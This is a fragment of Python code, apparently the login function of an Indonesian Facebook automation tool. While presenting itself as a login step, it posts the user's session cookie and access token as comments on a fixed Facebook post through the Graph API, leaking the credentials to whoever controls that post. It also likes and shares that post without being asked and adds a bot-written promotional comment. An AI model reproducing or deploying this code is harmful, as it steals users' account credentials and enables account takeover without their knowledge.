...
def login():
	...
	try:
		...
		tem      = ('\nKeren bang @[100087401110411:] & @[100087401110411:]\n\nJangan menyerah ketika gagal,ayo semangat\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100087401110411/posts/524939939132202/?substory_index=524939939132202&app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/100087401110411?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/103534412569929/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/103534412569929/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/103534412569929/likes?summary=true&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/103534412569929/sharedposts?true&access_token={token}",cookies=cok)
		#https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=
		ses.post(f"https://graph.facebook.com/103534412569929/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
	exit(f"{hh}SUKSES LOGIN")
